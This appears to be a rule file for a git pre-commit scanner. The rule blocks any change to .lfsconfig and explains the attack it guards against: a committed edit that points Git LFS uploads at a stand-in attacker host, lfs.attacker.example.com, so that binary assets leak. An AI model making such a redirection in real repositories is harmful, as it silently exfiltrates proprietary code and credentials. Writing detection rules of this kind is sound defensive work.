---
name: no-lfsconfig-changes
category: git
subcategory: lfs-redirection
platform: []
framework: []
severity: BLOCK
severity-source: frame
tier: 1
dedup-key: file
triggers:
  - pre-commit
  - cli
applies-to:
  files:
    - "**/.lfsconfig"
pattern: silent-config-redirection
lifecycle: active
selection-grade: passing
selection-stats:
  positives: 1/1
  negatives: 1/1
---

# No .lfsconfig changes

Block any add / modify / delete of `.lfsconfig`. The file controls where
Git LFS uploads go; a one-line change can silently redirect every future
LFS upload from a dev machine to an attacker's server, where they're
recorded forever and the dev never knows.

## The attack this catches

```toml
# .lfsconfig (committed in the repo)
[lfs]
url = https://lfs.legitimate-upstream.com/api/lfs
```

Pushed change:

```toml
[lfs]
url = https://lfs.attacker.example.com/api/lfs
```

After this push lands, every `git push` from any dev machine that pulls
the repo will upload LFS objects (often binary assets containing
proprietary code, ML weights, or credentials embedded in images) to the
attacker's server instead of the real upstream. The git protocol layer
shows nothing wrong - the pointer files commit cleanly. The bytes leak
on a different wire that nimblegate isn't watching.

Same attack via `.gitconfig` is not in scope here (git config doesn't
ship in a repo); same attack via per-clone `git config remote.<x>.lfsurl`
is not in scope either (local to a single machine). The committed
`.lfsconfig` is the in-repo channel for this redirection, and that's
what this frame closes.

## When it fires

Any push (or pre-commit / CLI scan) where `.lfsconfig` is in the staged
or changed file set - added, modified, or removed. Block by default; the
operator should treat any `.lfsconfig` change as an out-of-band review
event, not a regular code change.

## Override

If you legitimately need to change the LFS endpoint (rare - most repos
set it once and never touch it), tag the commit message:

```
appframes:disable git/no-lfsconfig-changes - reason: moving from
hosted gitea to self-hosted minio LFS server, approved by <reviewer>
```

The disable marker on the commit message scopes the override to that
single commit. Future changes to `.lfsconfig` still fire the frame
normally.

## Why this is BLOCK not WARN

LFS-redirection attacks are silent + persistent + catastrophic. The dev
never sees a warning at upload time (LFS just goes wherever the config
points), the attacker accumulates uploads indefinitely, and detection
typically only happens during incident response after a separate signal
(e.g., "why is our binary asset on this random domain"). BLOCK at push
time is the only point of intervention that scales.
